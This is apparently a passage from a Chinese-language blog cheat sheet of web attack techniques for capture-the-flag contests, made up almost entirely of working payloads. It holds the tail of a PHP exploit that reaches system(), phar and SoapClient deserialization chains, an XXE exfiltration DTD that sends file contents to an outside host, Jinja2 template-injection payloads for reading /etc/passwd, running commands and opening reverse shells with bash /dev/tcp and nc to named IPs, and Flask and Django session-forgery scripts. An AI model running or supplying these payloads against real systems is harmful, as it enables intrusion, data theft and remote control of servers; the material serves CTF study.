determine binary base address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF header"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><h3 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__construct()//创建对象时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br><span class="line">__sleep() //对象被序列化前触发</span><br><span class="line">__wakeup() //反序列化前触发</span><br><span class="line">__toString() //将对象当做字符串输出会触发</span><br></pre></td></tr></table></figure>

<h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>可以触发反序列化的函数</p>
<ul>
<li><code>fileatime</code> / <code>filectime</code> / <code>filemtime</code></li>
<li><code>stat</code> / <code>fileinode</code> / <code>fileowner</code> / <code>filegroup</code> / <code>fileperms</code></li>
<li><code>file</code> / <code>file_get_contents</code> / <code>readfile</code> / <code>fopen</code></li>
<li><code>file_exists</code> / <code>is_dir</code> / <code>is_executable</code> / <code>is_file</code> / <code>is_link</code> / <code>is_readable</code> / <code>is_writeable</code> / <code>is_writable</code></li>
<li><code>parse_ini_file</code></li>
<li><code>unlink</code></li>
<li><code>copy</code></li>
<li><code>finfo_file</code>/<code>finfo_buffer</code>/<code>mime_content_type</code></li>
</ul>
<p>触发条件phar或php伪协议</p>
<p>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://./test.phar</span><br></pre></td></tr></table></figure>

<p>生成phar文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">"&lt;?php __HALT_COMPILER();?&gt;"</span>);</span><br><span class="line">$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">$o -&gt; data = <span class="string">'h4ck3r'</span>;</span><br><span class="line">$phar -&gt; setMetadata($o);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">"test.txt"</span>,<span class="string">"test"</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>

<h3 id="XXE-2-phar"><a href="#XXE-2-phar" class="headerlink" title="XXE 2 phar"></a>XXE 2 phar</h3><p>XXE可以导致phar反序列化，例题：<a href="https://www.anquanke.com/post/id/170299#h3-6" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170299#h3-6</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">'&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/tmp/123.txt"&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM "https://ham.exeye.io/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">%remote;</span></span><br><span class="line"><span class="string">%all;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;&amp;send;&lt;/root&gt;'</span>;</span><br><span class="line"><span class="comment">// print_r(simplexml_load_string($xml));</span></span><br><span class="line">$exp = <span class="keyword">new</span> SimpleXMLElement(<span class="string">'https://ham.exeye.io/evil.xml'</span>,LIBXML_NOENT,<span class="keyword">True</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>evil.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "https://xxx/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>evil.dtd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY &amp;#x25; all &quot;&lt;!ENTITY send SYSTEM &apos;http://xxx/?%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="原生类反序列化"><a href="#原生类反序列化" class="headerlink" title="原生类反序列化"></a>原生类反序列化</h3><p>原生类同名函数的攻击漏洞，可以覆盖.htaccess，例题：bytectf2019</p>
<p>exp如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Admin();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $size;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $content_check;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;size = <span class="number">2048</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_check = <span class="keyword">new</span> Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">"/var/www/html/sandbox/0e06916ca1eb6fccbcde68a41bef7284/.htaccess"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = ZipArchive::OVERWRITE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exp.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> File();</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>

<p>利用__toString()来实现xss</p>
<p>error类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br></pre></td></tr></table></figure>

<p>exception类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br></pre></td></tr></table></figure>

<h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p>三种不同引擎会导致不同的处理结果，默认为php方式存储</p>
<p>php_binary：ascii字符+键名+serialize()函数处理后的值<br>php：键名+竖线+serialize()函数处理后的值<br>php_serialize：serialize()函数处理后的值</p>
<p>利用条件：开启了<code>session.upload_progress.enabled</code></p>
<p>加竖杠符合存储要求，反斜杠进行转义</p>
<h3 id="soap反序列化"><a href="#soap反序列化" class="headerlink" title="soap反序列化"></a>soap反序列化</h3><p>可以导致SSRF</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://123.206.216.198/bbb.php'</span>;</span><br><span class="line">$post_string = <span class="string">'a=b&amp;flag=aaa'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: xxxx=1234'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">'%0d%0a'</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'%26'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Mysql-触发phar反序列化"><a href="#Mysql-触发phar反序列化" class="headerlink" title="Mysql 触发phar反序列化"></a>Mysql 触发phar反序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $s = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, <span class="keyword">true</span>);</span><br><span class="line">$s = mysqli_real_connect($m, <span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'123456'</span>, <span class="string">'easyweb'</span>, <span class="number">3306</span>);</span><br><span class="line">$p = mysqli_query($m, <span class="string">'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;'</span>);</span><br></pre></td></tr></table></figure>

<p>待补充</p>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="Jinja2中的沙箱逃逸"><a href="#Jinja2中的沙箱逃逸" class="headerlink" title="Jinja2中的沙箱逃逸"></a>Jinja2中的沙箱逃逸</h3><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/evilconfig.cfg&apos;, &apos;w&apos;).write(&apos;test&apos;) &#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__</span><br><span class="line">下有eval，__import__等的全局函数，可以利用此来执行命令：</span><br><span class="line"></span><br><span class="line"><span class="comment">#eval</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('id').read()"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.eval(<span class="string">"__import__('os').popen('id').read()"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#__import__</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.__import__(<span class="string">'os'</span>).popen(<span class="string">'id'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">'id'</span>).read()</span><br></pre></td></tr></table></figure>

<h4 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/139.159.140.198/2345 0&gt;&amp;1"'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="加载自定义模块"><a href="#加载自定义模块" class="headerlink" title="加载自定义模块"></a>加载自定义模块</h4><p>写文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/evil'</span>, <span class="string">'w'</span>).write(<span class="string">'from os import system%0aCMD = system'</span>) &#125;&#125;</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/evil'</span>, <span class="string">'w'</span>).write(<span class="string">'from subprocess import check_output%0aRUNCMD=check_output'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>利用 config.from_pyfile 加载文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.from_pyfile(<span class="string">'/tmp/evil'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config[<span class="string">'RUNCMD'</span>](<span class="string">'bash -i &gt;&amp; /dev/tcp/192.168.86.131/8080 0&gt;&amp;1'</span>) &#125;&#125;</span><br><span class="line">&#123;&#123; config[<span class="string">'CMD'</span>](<span class="string">'nc 192.168.86.131 8080 -e /bin/sh'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#命令执行：</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"__import__('os').popen('id').read()"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#文件操作</span></span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'filename'</span>, <span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">-4</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">93</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="bypass-1"><a href="#bypass-1" class="headerlink" title="bypass"></a>bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[&apos;__cla&apos;+&apos;ss__&apos;].__base__.__base__.__base__[&apos;__subcla&apos;+&apos;sses__&apos;]()[163].__init__.__globals__[&apos;__bui&apos;+&apos;ltins__&apos;][&apos;op&apos;+&apos;en&apos;](&apos;/flag&apos;).read()</span><br></pre></td></tr></table></figure>

<h3 id="flask继承链读取配置文件"><a href="#flask继承链读取配置文件" class="headerlink" title="flask继承链读取配置文件"></a>flask继承链读取配置文件</h3><p> <code>__init__.__globals__[app].__dict__</code> </p>
<h3 id="flask-session-伪造"><a href="#flask-session-伪造" class="headerlink" title="flask session 伪造"></a>flask session 伪造</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">b'fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y'</span></span><br><span class="line"></span><br><span class="line">session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> session_serializer.dumps(<span class="string">"admin"</span>)</span><br><span class="line">    <span class="comment">#return "lol"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<h3 id="django-sessionid伪造（客户端存储认证信息"><a href="#django-sessionid伪造（客户端存储认证信息" class="headerlink" title="django sessionid伪造（客户端存储认证信息"></a>django sessionid伪造（客户端存储认证信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.environ.setdefault(<span class="string">'DJANGO_SETTINGS_MODULE'</span>,<span class="string">'settings'</span>)</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="keyword">from</span> django.contrib.sessions.backends <span class="keyword">import</span> signed_cookies</span><br><span class="line"><span class="keyword">from</span> passlib.hash <span class="keyword">import</span> pbkdf2_sha256</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.hashers <span class="keyword">import</span> make_password, check_password</span><br><span class="line"></span><br><span class="line">sess = signing.loads(<span class="string">'.eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iKcXo:zoHRyaS9hkddxcM5jTUjTGHL9uI'</span>,key=<span class="string">'d7um#o19q+v24!vkgzrxme41wz5#_h0#f_6u62fx0m@k&amp;uwe39'</span>,salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span>)</span><br><span class="line"><span class="keyword">print</span> sess</span><br><span class="line"></span><br><span class="line">sess[<span class="string">u'_auth_user_id'</span>] = <span class="string">u'1'</span></span><br><span class="line">sess[<span class="string">u'_auth_user_hash'</span>] = <span class="string">u'569127665f950beb6dd4a55098a8768f58814b04'</span></span><br><span class="line"><span class="comment"># '569127665f950beb6dd4a55098a8768f58814b04'</span></span><br><span class="line"><span class="keyword">print</span> sess</span><br><span class="line">s= signing.dumps(sess, key=<span class="string">'d7um#o19q+v24!vkgzrxme41wz5#_h0#f_6u62fx0m@k&amp;uwe39'</span>,compress=<span class="literal">True</span>, salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure>

<p>_auth_user_hash可以通过pycharm在login处下断点，单步调试，将数据库中的password替换生成</p>
